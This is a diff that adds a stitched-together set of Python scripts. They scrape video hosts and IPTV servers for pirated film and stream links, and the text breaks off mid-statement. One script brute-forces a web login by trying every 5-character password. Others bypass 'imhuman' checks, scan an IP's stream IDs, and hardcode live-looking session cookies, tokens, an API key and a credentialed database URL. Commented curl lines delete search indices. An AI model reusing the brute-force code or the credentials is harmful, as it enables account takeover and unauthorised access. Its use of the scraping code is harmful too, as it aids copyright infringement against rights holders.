@@ -1,0 +1,1852 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import requests, json
+import mechanize, urllib2
+import time, elasticAlluc
+from selenium import webdriver
+
+def getSeleniumOpenloadLink(url):
+    r = requests.get(url)
+    content = r.content
+    if content.find('We’re Sorry!') > 0:
+        return "NULL"
+    driver = webdriver.Chrome()
+    driver.get(url)
+    link = driver.execute_script(
+        "return 'https://openload.co/stream/'+document.getElementById('streamurl').innerHTML+'?mime=true';")
+    driver.close()
+    urlNew = urllib2.urlopen(link).geturl()
+    return urlNew
+
+
+def getgoogleDocMovieLink(url): #notWorking Yet
+    r = requests.get(url)
+    content = r.content
+    d = content[:content.rfind('"></video>')]
+    link = d[d.rfind('http'):]
+    print link
+    return link
+
+def getMp4FromUptostream(url): #notWorking Yet
+    r = requests.get(url)
+    content = r.content
+    d = content[:content.rfind('.mp4') + 4]
+    link = 'http://' + d[d.rfind('www'):]
+    print link
+    return link
+#getgoogleDocMovieLink('Https://docs.google.com/file/d/0B1g-qdF_18LKRmNOOWlkTVZzdjA/preview')
+
+
+#print set(getAllucJsonData(200, 100, 'מדובב'))
+
+def getMp4FromVidtoMe(url):
+    try:
+        br = mechanize.Browser()
+        br.set_handle_equiv(True)
+        br.set_handle_redirect(True)
+        br.set_handle_referer(True)
+        br.set_handle_robots(False)
+        res = br.open(url)
+        content = res.read()
+        if (content.find("File Not Found") > -1):
+            return "NULL"
+        br.select_form(nr=1)
+        time.sleep(5)
+        response = br.submit(name='imhuman', label='Proceed to video')
+        #newUrl =response.geturl()
+        content = response.read()
+        d = content[:content.find('.mp4') + 4]
+        link = d[d.rfind('http'):]
+        print link
+        return link
+    except:
+        print 'error'
+
+def getMp4FromGorillavidIn(url):
+    try:
+        br = mechanize.Browser()
+        br.set_handle_equiv(True)
+        br.set_handle_redirect(True)
+        br.set_handle_referer(True)
+        br.set_handle_robots(False)
+        res = br.open(url)
+        content = res.read()
+        if (content.find("File Not Found") > -1):
+            return "NULL"
+        br.select_form(nr=1)
+        time.sleep(1)
+        response = br.submit()
+        #newUrl =response.geturl()
+        content = response.read()
+        d = content[:content.find('.mp4') + 4]
+        link = d[d.rfind('http'):]
+        print link
+        return link
+    except:
+        print 'error'
+
+def getMp4FromNowvideoSx(url):
+        try:
+            br = mechanize.Browser()
+            br.set_handle_equiv(True)
+            br.set_handle_redirect(True)
+            br.set_handle_referer(True)
+            br.set_handle_robots(False)
+            br.open(url)
+            br.select_form(nr=0)
+            #time.sleep(5)
+            response = br.submit(name='submit', label='submit')
+            # newUrl =response.geturl()
+            content = response.read()
+            if (content.find("This video is not yet ready! Please try again later!") < 0):
+                return "NULL"
+            d = content[:content.find('.mp4') + 4]
+            link = d[d.rfind('http'):]
+            print link
+            return link
+        except:
+            print 'error'
+
+#getMp4FromNowvideoSx('http://www.nowvideo.sx/video/28c30f08f118c')
+
+
+def getMp4FromThevideoMe(url):
+
+    headers = {
+        'origin': 'https://9xbuddy.com',
+        'accept-encoding': 'gzip, deflate, br',
+        'x-requested-with': 'XMLHttpRequest',
+        'accept-language': 'en-US,en;q=0.8,he;q=0.6,uz;q=0.4',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36',
+        'x-csrftoken': 'ae360b0c4bea334a8fb7d63a213d6c45e3a11cff54f9adf61511464c99caf726',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'referer': 'https://9xbuddy.com/process?url={0}'.format(url),
+        'authority': '9xbuddy.com',
+        'cookie': '__cfduid=d2efa40efc8406025a3501759004eb6111505170933; PHPSESSID=heepc2qtc9at64dfp4jsrcmck5; notice=shown; _ga=GA1.2.1220725771.1505170935; _gid=GA1.2.1348551336.1505170935',
+    }
+
+    # headers = {
+    #     'origin': 'https://9xbuddy.com',
+    #     'accept-encoding': 'gzip, deflate, br',
+    #     'x-requested-with': 'XMLHttpRequest',
+    #     'accept-language': 'en-US,en;q=0.8,he;q=0.6,uz;q=0.4',
+    #     'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36',
+    #     'x-csrftoken': 'ae360b0c4bea334a8fb7d63a213d6c45e3a11cff54f9adf61511464c99caf726',
+    #     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    #     'accept': 'application/json, text/javascript, */*; q=0.01',
+    #     'referer': 'https://9xbuddy.com/process?url=https://thevideo.me/v44l0b03dl0a',
+    #     'authority': '9xbuddy.com',
+    #     'cookie': '__cfduid=d2efa40efc8406025a3501759004eb6111505170933; PHPSESSID=heepc2qtc9at64dfp4jsrcmck5; notice=shown; _ga=GA1.2.1220725771.1505170935; _gid=GA1.2.1348551336.1505170935',
+    # }
+
+    data = [
+        ('url', url),
+    ]
+
+
+    try:
+        r = requests.post('https://9xbuddy.com/action/extract', headers=headers, data=data)
+        data = json.loads(r.content)['response']
+        link = data['formats'][len(data['formats']) - 1]['children'][0]['children'][3]['children'][0]['href']
+    except:
+        return None
+    return link
+
+
+#getMp4FromThevideoMe('https://thevideo.me/qigenn37gbxy')
+
+def getMp4FromBitvidSx(url):
+    try:
+        br = mechanize.Browser()
+        br.set_handle_equiv(True)
+        br.set_handle_redirect(True)
+        br.set_handle_referer(True)
+        br.set_handle_robots(False)
+        br.open(url)
+        br.select_form(nr=1)
+        response = br.submit(name='submit', label='submit')
+        content = response.read()
+        if(content.find("No compatible source was found for this video.") > -1):
+            return "NULL"
+        d = content[:content.find('.mp4') + 4]
+        link = d[d.rfind('http'):]
+        print link
+        return link
+    except:
+        print 'error'
+
+def getMp4FromMovpodIn(url):
+    try:
+        br = mechanize.Browser()
+        br.set_handle_equiv(True)
+        br.set_handle_redirect(True)
+        br.set_handle_referer(True)
+        br.set_handle_robots(False)
+        res = br.open(url)
+        content = res.read()
+        if (content.find("File Not Found") > -1):
+            return "NULL"
+        br.select_form(nr=1)
+        response = br.submit()
+        content = response.read()
+        d = content[:content.find('.mp4') + 4]
+        link = d[d.rfind('http'):]
+        print link
+        return link
+    except:
+        print 'error'
+
+def getMp4FromCloudtimeTo(url):
+    try:
+        br = mechanize.Browser()
+        br.set_handle_equiv(True)
+        br.set_handle_redirect(True)
+        br.set_handle_referer(True)
+        br.set_handle_robots(False)
+        br.open(url)
+        br.select_form(nr=0)
+        response = br.submit(name='submit', label='submit')
+        content = response.read()
+        if (content.find("No compatible source was found for this video.") > -1):
+            return "NULL"
+        d = content[:content.find('.mp4') + 4]
+        link = d[d.rfind('http'):]
+        if link == 'D':
+            return "NULL"
+        return link
+    except:
+        print 'error'
+
+#getMp4FromBitvidSx('http://www.bitvid.sx/file/9701fc8d2b0d9')
+
+def getMp4FromStreamcloudEu(url):
+    try:
+        br = mechanize.Browser()
+        br.set_handle_equiv(True)
+        br.set_handle_redirect(True)
+        br.set_handle_referer(True)
+        br.set_handle_robots(False)
+        res = br.open(url)
+        content = res.read()
+        if (content.find("No such file with this filename") > -1):
+            return "NULL"
+        br.select_form(nr=0)
+        time.sleep(10)
+        response = br.submit(name='imhuman', label='Watch video now')
+        # newUrl =response.geturl()
+        content = response.read()
+        d = content[:content.find('.mp4') + 4]
+        link = d[d.rfind('http'):]
+        print link
+        return link
+    except:
+        print 'error'
+
+#getMp4FromStreamcloudEu('http://streamcloud.eu/nnqi61sjsbcg/Tom.and.Jerry.Blast.Off.to.Mars.DVDRip._XviD._HebDub.WWW.SERETIL.ME.avi.html')
+
+
+# def getMp4FromOpenloadCo(url):
+#     try:
+#         br = mechanize.Browser()
+#         br.set_handle_equiv(False)
+#         # br.set_handle_redirect(True)
+#         # br.set_handle_referer(True)
+#         br.set_handle_robots(False)
+#         br.addheaders = [('User-agent',
+#                           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36')]
+#         resp = br.open(url)
+#         headers = resp.info()
+#         content = resp.read()
+#         d = content[content.find('streamurl') + 11:]
+#         link = d[d.rfind('http'):]
+#         print link
+#         return link
+#     except Exception, e:
+#         print 'error', e.message
+#
+getSeleniumOpenloadLink('https://openload.co/embed/ziH6tSE5Io/')
+# print d
+
+def getMp4FromVidziTv(url):
+    try:
+        response = requests.get(url)
+        # newUrl =response.geturl()
+        content = response.content
+        d = content[:content.find('.mp4') + 4]
+        link = d[d.rfind('http'):]
+        return link
+    except:
+        print 'error'
+
+#getMp4FromVidziTv('http://vidzi.tv/9fmygeye6gy1.html')
+
+
+def getMp4FromAuroravidTo(url):
+    try:
+        br = mechanize.Browser()
+        br.set_handle_equiv(True)
+        br.set_handle_redirect(True)
+        br.set_handle_referer(True)
+        br.set_handle_robots(False)
+        br.open(url)
+        br.select_form(nr=0)
+        response = br.submit(name='submit', label='submit')
+        # newUrl =response.geturl()
+        content = response.read()
+        if(content.find("No compatible source was found for this video.") > -1):
+            return "NULL"
+        d = content[:content.find('.mp4') + 4]
+        link = d[d.rfind('http'):]
+        if link == 'D':
+            return "NULL"
+        return link
+    except:
+        print 'error'
+#getMp4FromStreamcloudEu('http://streamcloud.eu/9j0ingd4c7i3/Harry.Potter.And.The.Prisoner.Of.Azkaban.DVDRiP.XviD.CD2-HEBDUB-MORIDIM.ME.avi.html')
+
+
+
+def getAllucJsonData(from1, count, query):
+    r = requests.get("https://www.alluc.ee/api/search/stream/?apikey=ab1f790c52ad9d0bbdf099127dddca40&callback=?&count={0}&from={1}&query={2}&getmeta=1".format(count, from1, query))
+    data = json.loads(r.content)['result']
+    list = []
+    for d in data:
+        dict = {}
+        dict['filedataid'] = d['hosterurls'][0]['filedataid']
+        dict['sourceUrl'] = d['hosterurls'][0]['url']
+        dict['title'] = d['title']
+        dict['sourceTitle'] = d['sourcetitle']
+        dict['hostName'] = d['hostername']
+        list.append(dict)
+    return list
+
+#vidgg.to,
+def startCrawling(query):
+    print ('starting crawling', query)
+    count = 0
+    for i in range(10, 1000):
+        list = getAllucJsonData(i * 100, 100, query)
+        for l in list:
+            count += 1
+            if elasticAlluc.isLinkExist(l['filedataid']):
+               continue
+            host = l['hostName']
+            url = l['sourceUrl']
+            link = None
+            if host == 'thevideo.me':
+                getMp4FromThevideoMe(url)
+            elif host == 'nowvideo.sx':
+                link = getMp4FromNowvideoSx(url)
+            elif host == 'auroravid.to':
+                link = getMp4FromAuroravidTo(url)
+            elif host == 'bitvid.sx':
+                link = getMp4FromBitvidSx(url)
+            elif host == 'vidzi.tv':
+                link = getMp4FromVidziTv(url)
+            elif host == 'docs.google.com':
+                continue
+            elif host == 'streamcloud.eu':
+                link = getMp4FromStreamcloudEu(url)
+            elif host == 'vidto.me':
+                link = getMp4FromVidtoMe(url)
+            elif host == 'openload.co':
+                link = getSeleniumOpenloadLink(url)
+            elif host == 'uptostream.com':
+                link = getMp4FromUptostream(url)
+            elif host == 'gorillavid.in':
+                link = getMp4FromGorillavidIn(url)
+            elif host == 'cloudtime.to':
+                link = getMp4FromCloudtimeTo(url)
+            elif host == 'movpod.in':
+                link = getMp4FromMovpodIn(url)
+            elif host == 'estream.to': #'https://estream.to/c10zk71gam4z.html'
+                continue
+            else:
+                continue
+
+            isNoMp4 = None
+            if link:
+                if link == "NULL":
+                    isNoMp4 = True
+            print (count, link, l['title'], l['sourceUrl'], host)
+            elasticAlluc.add(l['filedataid'], link, l['title'], l['sourceUrl'], l['sourceTitle'], host, query, isNoMp4)
+        if len(list) < 100:
+            print ('finished', query, count)
+            return
+#getMp4FromUptostream('http://uptostream.com/2fnr56j4i7x2')
+startCrawling('מדובב')
+#getMp4FromGorillavidIn('http://gorillavid.in/d314xvqt6sx8')
+#getMp4FromCloudtimeTo('http://www.cloudtime.to/video/acb8bbd33c602')
+#getMp4FromThevideoMe('https://thevideo.me/qigenn37gbxy')
+#getMp4FromMovpodIn('http://movpod.in/decvs2bk3d0q')
+
+#'The.Lion.King.1994.WS.DVDRip.XviD.HebDubbed-Gozlan.Horadot.Net_2.avi', 'Spiderman_1994_S01E02_HebDub_XviD.avi' 'Hamofa_Shel_LuLu_S01E01_HebDub_XviD' 'Planes.2013.BDRip.X264-HebDub-Eliran+Gozlan-_2'
+#'Smurfs E131 PDTV HebDub XviD-Yonidan', 'Movie', u'Smurfs E131')
+# blackList = ['hebdub', 'eliran', 'gozlan', 'hebdubd', 'hebdubbed']
+# import PTN
+# lines = elasticAlluc.getAll(1000)
+# for l in lines:
+#     info = PTN.parse(l['title'])
+#     if info.__contains__('season') and info.__contains__('episode'):
+#         info['type'] = 'TV'
+#     else:
+#         info['type'] = 'Movie'
+#     print(l['title'], info['type'], info['title'])
+import requests
+import m3uFileChecker
+import json, tester
+
+def checkOneM3uFile(m3uFilePath, source = None):
+    playlist = m3uFileChecker.parsem3u(m3uFilePath, False, source)
+    for p in playlist:
+        if (p['path'].endswith('.mp4')):
+            try:
+                p['title'] = 'mp4 - {0}'.format(p['title'].encode('utf-8'))
+                print p['title']
+            except:
+                continue
+    # if playlist.__len__() > 0:
+    #     with open(outJsonFilePath, 'w') as outfile:
+    #         json.dump(playlist, outfile)
+    #     print "finished analyzing m3u file"
+    # else:
+    #     print "no working m3u list"
+
+checkOneM3uFile("/home/menny/Documents/m3uAnalyze/iptvzone/iptvzone.m3u", 'iptvzone')
+def downloadId(id):
+    try:
+        r = requests.get('https://pastebin.com/raw/{0}'.format(id))
+        if r.status_code == 200:
+            content = r.content
+            if content.startswith('#EXTM3U'):
+                with open("/home/menny/Documents/m3uAnalyze/{0}.m3u".format(id), 'wb') as f:
+                    f.write(content)
+                return 1
+            else:
+                return -1
+        else:
+            return r.status_code
+    except Exception, e:
+        return 0
+def checkSomePastbinIds():
+    for id in [' FvFQdp8A','n2SE9DTp','ffGsL/3m0','DKJyuwHH','SMkGQDAm','2rVZ6LZ','LnZU7sgG',
+               'uxEW2sr3','MuZ7ab1P','5yx8tQrL']:
+        status = downloadId(id)
+        print("finished id: {0} with status: {1}".format(id, status))
+        if status == 1:
+            playlist = m3uFileChecker.parsem3u("/home/menny/Documents/m3uAnalyze/{0}.m3u".format(id), 'pastebin', id)
+            if playlist.__len__() > 0:
+                with open('/home/menny/Documents/m3uAnalyze/{0}.json'.format(id), 'w') as outfile:
+                    json.dump(playlist, outfile)
+                print "finished analyzing m3u file"
+            else:
+                print "no working m3u list"
+
+def scanUrlTs():
+    list = []
+    for i in range(20000):
+        url = "http://217.23.1.3:6969/live/batman/batman/{0}.m3u8".format(i)
+        speed = tester.downloadFile(url)
+        print (speed, url)
+        if speed > 0 and speed < 1:
+            extLine = {'time_elapsed': speed, 'title': str(i), 'path': url}
+            list.append(extLine)
+    return list
+
+# playlist = scanUrlTs()
+# id = "scanIl"
+# with open('/home/menny/Documents/m3uAnalyze/{0}.json'.format(id), 'w') as outfile:
+#     json.dump(playlist, outfile)
+# print "finished analyzing m3u file"
+
+#checkSomePastbinIds()
+#!/usr/bin/python
+import mechanize
+import itertools
+
+br = mechanize.Browser()
+br.set_handle_equiv(True)
+br.set_handle_redirect(True)
+br.set_handle_referer(True)
+br.set_handle_robots(False)
+
+l = []
+combos = itertools.permutations("abcdefghijklmnopqrstuvwxyz0123456789",5)
+for x in combos:
+    l.append(''.join(x))
+
+br.open("http://www.example.com/login/")
+for x in l:
+	br.select_form( nr = 0 )
+	br.form['userName'] = "user name"
+	br.form['password'] = ''.join(x)
+	print "Checking ",br.form['password']
+	response=br.submit()
+	if response.geturl()=="http://www.example.com/redirected_to_url":
+		#url to which the page is redirected after login
+		print "Correct password is ",''.join(x)
+		break
+import tester,elasticIptv
+
+def testElasticSourceDownload():
+    lines = elasticIptv.getWorkingList(10000)
+    print 'got from elastic {0} rows'.format(len(lines))
+    for l in lines:
+        fileName = generateFileName(l['title'])
+        status = tester.downloadFile(l['link'], 1000, fileName, 10000000)
+        if status == 0 or status == None:
+            elasticIptv.add(link=l['link'], speed=0)
+        elif status > 300:
+            elasticIptv.add(link=l['link'], speed=0, statuscode=status)
+        else:
+            elasticIptv.add(link=l['link'], statuscode=200, downloadSpeed=status)
+        print status, fileName
+    return True
+
+def generateFileName(title):
+    from time import gmtime, strftime
+    id = strftime("%Y%m%d%H%M%S", gmtime())
+    fileName = "{0} - {1}".format(id, title.encode('utf-8'))
+    return fileName
+
+testElasticSourceDownload()
+
+import clipboard, json
+
+def xml_out(parsed_file, id):
+    with open("/home/menny/Documents/m3uAnalyze/clipboard/{0}.xml".format(id), 'w') as f:
+        f.write('<streamingInfos>\n')
+        for i in parsed_file:
+            f.write('<item>\n')
+            f.write('<title>{0}</title>\n'.format(i["title"]))
+            f.write('<link>plugin://plugin.video.f4mTester/?streamtype=TSDOWNLOADER&amp;url={0}</link>\n'.format(i["path"]))
+            f.write('<thumbnail>{0}</thumbnail>\n'.format(""))
+            f.write('</item>\n')
+        f.write('</streamingInfos>\n')
+
+s = clipboard.paste().lower()
+d = s.split('\n')
+playlist = []
+for line in d:
+    try:
+        if line.startswith('#extm3u'):
+            continue
+        elif line.startswith('#extinf:'):
+            # pull length and title from #EXTINF line
+            info, title = line.split('#extinf:')[1].split(',', 1)
+            extLine = {'info': info, 'title': title}
+        elif (len(line) != 0):
+            # pull song path from all other, non-blank lines
+            extLine['path'] = line
+            if line.__contains__('youtube.com') or line.__contains__('radio') or \
+                    extLine['title'].__contains__('radio') or line.__contains__('youtu.be'):
+                continue
+            extLine['time_elapsed'] = 0.5
+            playlist.append(extLine)
+            # reset the song variable so it doesn't use the same EXTINF more than once
+
+    except:
+        print ("error", line)
+        continue
+xml_out(playlist, 'israel')
+print "finished"
+import requests
+
+headers = {
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'en-US,en;q=0.8,he;q=0.6,uz;q=0.4',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'referer': 'https://iptv.zone/en/playlist/269548',
+    'authority': 'iptv.zone',
+    'cookie': '__cfduid=d67401a47d00068f9f03994c1ab2d27551503822951; bblastvisit=1503822951; _ym_uid=1503822980523290443; _ym_isad=1; bbtimezoneoffset=3; bblastactivity=0; bbuserid=84658; bbpassword=8180841e009effe43191eaf91b48291c; IDstack=%2C84658%2C; bblanguageid=1; bbsessionhash=bfd5e465ea9b1f8f584d405147609e18; bbplaylist=%2C269548',
+}
+
+params = (
+    ('s', ''),
+    ('securitytoken', '1503842455-f5ec3471546f665e88784a069127761795d3b52e'),
+    ('format', ''),
+)
+
+requests.get('https://iptv.zone/en/download/269550', headers=headers, params=params)
+
+#NB. Original query string below. It seems impossible to parse and
+#reproduce query strings 100% accurately so the one below is given
+#in case the reproduced version is not "correct".
+# requests.get('https://iptv.zone/en/download/269550?s=&securitytoken=1503842455-f5ec3471546f665e88784a069127761795d3b52e&format=', headers=headers)
+
+from elasticsearch import Elasticsearch
+
+es = Elasticsearch('localhost:9200')
+
+from datetime import datetime
+
+# clear index
+#curl -XDELETE 'http://localhost:9200/alluc/'
+
+def add(filedataid, mp4Link = None, title = None, sourceUrl = None, sourceTitle = None, hostName = None, query = None, isNoMp4 = None):
+
+    doc = {
+        'lastupdate': datetime.now(),
+    }
+    if title:
+        doc['title'] = title
+    if mp4Link:
+        doc['mp4Link'] = mp4Link
+    if sourceUrl:
+        doc['sourceUrl'] = sourceUrl
+    if sourceTitle:
+        doc['sourceTitle'] = sourceTitle
+    if hostName:
+        doc['hostName'] = hostName
+    if query:
+        doc['query'] = query
+    if isNoMp4 != None:
+        doc['isNoMp4'] = isNoMp4
+
+    try:
+        exist = es.exists(index="alluc", doc_type='mp4', id=filedataid)
+        #res = es.search(index="iptv", doc_type="m3u", body=queryExact)
+        if exist:
+            res = es.update(index="alluc", doc_type='mp4', id=filedataid, body={'doc': doc})
+            print "elastic updated"
+        else:
+            doc['create'] = datetime.now()
+            res = es.index(index="alluc", doc_type='mp4', id=filedataid, body=doc)
+            print ("elastic created", doc)
+
+        #print(res['elastic success'])
+    except Exception, e:
+        print e
+
+def isLinkExist(filedataid):
+    try:
+        return es.exists(index="alluc", doc_type='mp4', id=filedataid)
+    except Exception, e:
+        print e
+
+def getListWithSpeed(size):
+    query = {
+        "query": {
+            "range" : {
+                "speed" : {
+                    "gte" : 0.000000001,
+                    "lte" : 0.9
+                }
+            }
+        },
+        "sort" : [
+        "title"
+        ],
+        "size": size
+    }
+    return returnQuery(query)
+
+def getListWithDownloadStatus(size):
+    query = {
+        "query": {
+            "range" : {
+                "downloadSpeed" : {
+                    "gte" : 0.01,
+                    "lte" : 2.9
+                }
+            }
+        },
+        "sort" : [
+        "downloadSpeed"
+        ],
+        "size": size
+    }
+    return returnQuery(query)
+
+def getTVListWithDownloadStatus(from1, size, type):
+    query = {
+        "query": {
+        "bool": {
+            "must": {
+                "constant_score": {
+                    "filter": {
+                        "term": {
+                            "type": type
+                        }
+                    }
+                }
+        },
+            "filter": {
+                "range": {"downloadSpeed": {
+                    "gte" : 0.0001,
+                    "lte" : 3
+                }}
+            }
+        }},
+        "sort" : [
+        "title"
+        ],
+        "from": from1,
+        "size": size
+
+    }
+    return returnQuery(query)
+
+def getAll(size):
+    query = {
+        "query": {
+            "match_all": {}
+        },
+        "size": size
+    }
+    return returnQuery(query)
+
+def searchTitle(titleKey, size):
+    query = {
+        "query": {
+        "bool": {
+            "must": {
+          "query_string": {
+            "default_field": "title",
+            "query": "*{0}*".format(titleKey)
+          }
+        },
+            "filter": {
+                "range": {"speed": {
+                    "gte" : 0.000000001,
+                    "lte" : 0.9
+                }}
+            }
+        }},
+        "sort" : [
+        "title"
+        ],
+        "size": size
+    }
+    return returnQuery(query)
+
+def searchWorkingMp4(from1,  size):
+    query = {
+        "query": {
+        "bool": {
+            "must": {
+          "query_string": {
+            "default_field": "mp4Link",
+            "query": "*http*"
+          }
+        }
+        }},
+        "from": from1,
+        "size": size
+    }
+    return returnQuery(query)
+
+def getListWithSpeedNoDownloadStatus(size):
+    query = {
+        "query": {
+            "bool": {
+                "must_not": {
+                    "exists": {"field": "downloadSpeed"}
+                },
+                "filter": {
+                    "range": {"speed": {
+                        "gte": 0.000000001,
+                        "lte": 0.9
+                    }}
+                }
+            }},
+        "size": size
+    }
+    return returnQuery(query)
+
+def getListWithDownloadNoType(from1, size):
+    query = {
+        "query": {
+            "bool": {
+                "must_not": {
+                    "exists": {"field": "type"}
+                },
+                "filter": {
+                    "range": {"speed": {
+                        "gte": 0.000000001,
+                        "lte": 0.9
+                    }}
+              }
+            }},
+        "from": from1,
+        "size": size
+    }
+    return returnQuery(query)
+
+def returnQuery(query):
+    res = es.search(index="alluc", doc_type="mp4", body=query)
+    lines = []
+    for hit in res['hits']['hits']:
+        #print(hit['_id'], hit["_source"])
+        lines.append(hit["_source"])
+    return lines
+
+# list = searchWorkingMp4(10000)
+# print len(list)
+# for l in list:
+#    add(link=l['link'], type='vod')
+
+from elasticsearch import Elasticsearch
+
+es = Elasticsearch('localhost:9200')
+
+from datetime import datetime
+
+# clear index
+#curl -XDELETE 'http://localhost:9200/iptv/'
+
+def add(link, title = None, speed = None, info = None, statuscode = None, source = None,
+        m3uID = None, downloadSpeed = None, type = None):
+
+    doc = {
+        'link': link,
+        'lastupdate': datetime.now(),
+    }
+    if title:
+        doc['title'] = title
+    if speed != None:
+        doc['speed'] = speed
+    if info:
+        doc['info'] = info
+    if statuscode:
+        doc['statuscode'] = statuscode
+    if source:
+        doc['source'] = source
+    if m3uID:
+        doc['m3uID_'] = m3uID
+    if downloadSpeed:
+        doc['downloadSpeed'] = downloadSpeed
+    if type:
+        doc['type'] = type
+
+    try:
+        exist = es.exists(index="iptv", doc_type='m3u', id=link)
+        #res = es.search(index="iptv", doc_type="m3u", body=queryExact)
+        if exist:
+            res = es.update(index="iptv", doc_type='m3u', id=link, body={'doc': doc})
+            print "elastic updated"
+        else:
+            doc['create'] = datetime.now()
+            if link.endswith('.mp4') or link.endswith('.flv') or link.endswith('.mkv'):
+                doc['type'] = 'vod'
+            else:
+                doc['type'] = 'tv'
+            res = es.index(index="iptv", doc_type='m3u', id=link, body=doc)
+            print ("elastic created", doc)
+
+        #print(res['elastic success'])
+    except Exception, e:
+        print e
+
+def isLinkExist(link):
+    try:
+        # queryExact = {
+        #     "query": {
+        #         "constant_score": {
+        #             "filter": {
+        #                 "term": {
+        #                     "link": link
+        #                 }
+        #             }
+        #         }
+        #     }
+        # }
+
+        #res = es.search(index="iptv", doc_type="m3u", body=queryExact)
+        #exist = res['hits']['total'] > 0
+        #print (link, exist)
+        return es.exists(index="iptv", doc_type='m3u', id=link)
+    except Exception, e:
+        print e
+
+def getListWithSpeed(size):
+    query = {
+        "query": {
+            "range" : {
+                "speed" : {
+                    "gte" : 0.000000001,
+                    "lte" : 0.9
+                }
+            }
+        },
+        "sort" : [
+        "title"
+        ],
+        "size": size
+    }
+    return returnQuery(query)
+
+def getListWithDownloadStatus(size):
+    query = {
+        "query": {
+            "range" : {
+                "downloadSpeed" : {
+                    "gte" : 0.01,
+                    "lte" : 2.9
+                }
+            }
+        },
+        "sort" : [
+        "downloadSpeed"
+        ],
+        "size": size
+    }
+    return returnQuery(query)
+
+def getTVListWithDownloadStatus(from1, size, type):
+    query = {
+        "query": {
+        "bool": {
+            "must": {
+                "constant_score": {
+                    "filter": {
+                        "term": {
+                            "type": type
+                        }
+                    }
+                }
+        },
+            "filter": {
+                "range": {"downloadSpeed": {
+                    "gte" : 0.0001,
+                    "lte" : 3
+                }}
+            }
+        }},
+        "sort" : [
+        "title"
+        ],
+        "from": from1,
+        "size": size
+
+    }
+    return returnQuery(query)
+
+def searchTitle(titleKey, size):
+    query = {
+        "query": {
+        "bool": {
+            "must": {
+          "query_string": {
+            "default_field": "title",
+            "query": "*{0}*".format(titleKey)
+          }
+        },
+            "filter": {
+                "range": {"speed": {
+                    "gte" : 0.000000001,
+                    "lte" : 0.9
+                }}
+            }
+        }},
+        "sort" : [
+        "title"
+        ],
+        "size": size
+    }
+    return returnQuery(query)
+
+def searchVod( size):
+    query = {
+        "query": {
+        "bool": {
+            "must": {
+          "query_string": {
+            "default_field": "link",
+            "query": "*flv*"
+          }
+        },
+            "filter": {
+                "constant_score": {
+                    "filter": {
+                        "term": {
+                            "type": 'tv'
+                        }
+                    }
+                }
+            }
+        }},
+        "sort" : [
+        "title"
+        ],
+        "size": size
+    }
+    return returnQuery(query)
+
+def getListWithSpeedNoDownloadStatus(size):
+    query = {
+        "query": {
+            "bool": {
+                "must_not": {
+                    "exists": {"field": "downloadSpeed"}
+                },
+                "filter": {
+                    "range": {"speed": {
+                        "gte": 0.000000001,
+                        "lte": 0.9
+                    }}
+                }
+            }},
+        "size": size
+    }
+    return returnQuery(query)
+
+def getListWithDownloadNoType(from1, size):
+    query = {
+        "query": {
+            "bool": {
+                "must_not": {
+                    "exists": {"field": "type"}
+                },
+                "filter": {
+                    "range": {"speed": {
+                        "gte": 0.000000001,
+                        "lte": 0.9
+                    }}
+              }
+            }},
+        "from": from1,
+        "size": size
+    }
+    return returnQuery(query)
+
+def returnQuery(query):
+    res = es.search(index="iptv", doc_type="m3u", body=query)
+    lines = []
+    for hit in res['hits']['hits']:
+        #print(hit['_id'], hit["_source"])
+        lines.append(hit["_source"])
+    return lines
+
+list = searchVod(10000)
+for l in list:
+    add(link=l['link'], type='vod')
+
+import os, base64, re, logging
+from elasticsearch import Elasticsearch, RequestsHttpConnection
+import certifi
+
+# # Log transport details (optional):
+# logging.basicConfig(level=logging.INFO)
+#
+# # Parse the auth and host from env:
+# bonsai = 'https://7tq809ui9t:81zcbfj9rc@first-cluster-899029525.us-east-1.bonsaisearch.net'
+# auth = re.search('https\:\/\/(.*)\@', bonsai).group(1).split(':')
+# host = bonsai.replace('https://%s:%s@' % (auth[0], auth[1]), '')
+#
+# # Connect to cluster over SSL using auth for best security:
+# es_header = [{
+#   'host': host,
+#   'port': 443,
+#   'use_ssl': True,
+#
+#   'http_auth': (auth[0],auth[1])
+# }]
+#
+# # Instantiate the new Elasticsearch connection:
+# es = Elasticsearch(
+#     host= host,
+#     http_auth=(auth[0],auth[1]),
+#     port=443,
+#     use_ssl=True,
+#     verify_certs=True,
+#     ca_certs=certifi.where(),
+# )
+es = Elasticsearch('localhost:9200')
+# Verify that Python can talk to Bonsai (optional):
+es.ping()
+
+from elasticsearch import Elasticsearch
+from datetime import datetime
+doc = {
+    'link': 'runfirstIndex',
+    'title': 'Elasticsearch: cool',
+    'speed': 0.005,
+    'create': datetime.now(),
+    'lastupdate': datetime.now(),
+    'info': 'inf',
+    'statuscode': 401,
+    'source': 'pastebin'
+}
+try:
+
+    res = es.index(index="iptv", doc_type='m3u', body=doc)
+    # print(res['created'])
+    #res = es.create("iptv", 'm3u', body=doc)
+    #print(res)
+    # res = es.update("iptv", 'm3u', 'AV48G6veDFC85K7o6SsB', {'doc': doc})
+    # print(res['updated'])
+except Exception, e:
+    print e
+
+#res = es.get(index="iptv", doc_type='m3u', id='AV48G6veDFC85K7o6SsB')
+#print(res['_source'])
+
+es.indices.refresh(index="iptv")
+
+res = es.search(index="iptv", body={"query": {"match_all": {}}})
+query2field = {
+  "query": {
+    "bool": {
+      "must": [{"match": {"link": "http://66.70.178.201:25461/live/demo/70w/25.ts"}}],
+      #"must": [{"match": {"test": 9}}]
+    }
+  }
+}
+ry = {"query": {"match": {"link": 'http://66.70.178.201:25461/live/demo/70w/25.ts'}}}
+queryExact = {
+    "query" : {
